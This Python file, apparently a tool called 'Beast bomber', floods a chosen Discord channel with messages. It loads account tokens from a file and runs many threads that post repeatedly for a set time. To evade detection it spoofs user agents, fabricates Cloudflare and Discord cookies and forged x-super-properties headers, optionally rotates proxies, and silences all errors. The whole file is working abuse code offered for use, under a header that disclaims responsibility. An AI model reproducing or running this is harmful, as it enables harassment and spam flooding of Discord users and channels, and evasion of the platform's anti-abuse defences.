"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/un1cum                                                      ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                            Copyright (C) 2023 un1cum                            ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""
import requests
import base64
import httpagentparser
import random
import time
from threading import Thread
from fake_useragent import UserAgent
from ua_parser import user_agent_parser


def randstr(lenn):
    lib = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += lib[random.randint(0, len(lib) - 1)]
    return text


def start_discord(threads, time_a, message, idd, proxy):
    if proxy == "no":
        for _ in range(threads):
            th = Thread(target=discord_attack1, args=(idd, time_a, message))
            th.start()

    else:
        for _ in range(threads):
            th = Thread(target=discord_attack2, args=(idd, time_a, message))
            th.start()


def discord_attack1(idd, time_a, mes):
    t = time.monotonic()
    accounts = []
    ua = UserAgent()

    with open('input/discord_accounts.txt', 'r') as file:
        for line in file:
            accounts.append(line.replace('\n', ''))

    while time.monotonic() - t < time_a:
        for acc in accounts:
            try:
                user = ua.random
                parsed_string = user_agent_parser.Parse(user)
                parsed_string2 = httpagentparser.detect(user)
                osv = str(parsed_string["user_agent"]["major"])
                bv = str(parsed_string2["browser"]["version"])

                string = '{' + f'"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"user + f","browser_version":"{bv}","os_version":"{osv}","referrer":"https://www.google.com/","referring_domain":"www.google.com","search_engine":"google","referrer_current":"https://www.google.com/","referring_domain_current":"www.google.com","search_engine_current":"google","release_channel":"stable","client_build_number":169464,"client_event_source":null' + '}'
                cookie = f"__dcfduid={randstr(32)}; __sdcfduid={randstr(96)}; locale=ru; __cf_bm={randstr(189)}"

                message_bytes = string.encode('ascii')
                xsuper = str(base64.b64encode(message_bytes)).replace("b'", '')
                xsuper = xsuper.replace("'", '')

                header = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
                    'authorization': acc,
                    'content-length': str(26 + len(mes)),
                    'content-type': 'application/json',
                    'cookie': cookie,
                    'dnt': '1',
                    'origin': 'https://discord.com',
                    'referer': f'https://discord.com/channels/@me/{idd}',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': user,
                    'x-debug-options': 'bugReporterEnabled',
                    'x-discord-locale': 'en-US',
                    'x-super-properties': xsuper
                }

                payload = {"content": mes, "tts": False}

                requests.post(f'https://discord.com/api/v9/channels/{idd}/messages', json=payload, headers=header)

            except:
                pass


def discord_attack2(idd, time_a, mes):
    t = time.monotonic()
    proxies = []
    accounts = []
    ua = UserAgent()

    with open('input/proxies.txt', 'r') as file:
        for line in file:
            proxies.append(line.replace('\n', ''))

    with open('input/discord_accounts.txt', 'r') as file:
        for line in file:
            accounts.append(line.replace('\n', ''))

    while time.monotonic() - t < time_a:
        for acc in accounts:
            try:
                user = ua.random
                parsed_string = user_agent_parser.Parse(user)
                parsed_string2 = httpagentparser.detect(user)
                osv = str(parsed_string["user_agent"]["major"])
                bv = str(parsed_string2["browser"]["version"])

                proxy = random.choice(proxies)
                proxy_2 = {
                    "http": "http://" + proxy,
                    "https": "https://" + proxy
                }

                string = '{' + f'"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"user + f","browser_version":"{bv}","os_version":"{osv}","referrer":"https://www.google.com/","referring_domain":"www.google.com","search_engine":"google","referrer_current":"https://www.google.com/","referring_domain_current":"www.google.com","search_engine_current":"google","release_channel":"stable","client_build_number":169464,"client_event_source":null' + '}'
                cookie = f"__dcfduid={randstr(32)}; __sdcfduid={randstr(96)}; locale=ru; __cf_bm={randstr(189)}"

                message_bytes = string.encode('ascii')
                xsuper = str(base64.b64encode(message_bytes)).replace("b'", '')
                xsuper = xsuper.replace("'", '')

                header = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
                    'authorization': acc,
                    'content-length': str(26+len(mes)),
                    'content-type': 'application/json',
                    'cookie': cookie,
                    'dnt': '1',
                    'origin': 'https://discord.com',
                    'referer': f'https://discord.com/channels/@me/{idd}',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': user,
                    'x-debug-options': 'bugReporterEnabled',
                    'x-discord-locale': 'en-US',
                    'x-super-properties': xsuper
                }

                payload = {"content": mes, "tts": False}

                requests.post(f'https://discord.com/api/v9/channels/{idd}/messages', json=payload, headers=header,
                              proxies=proxy_2)

            except:
                pass
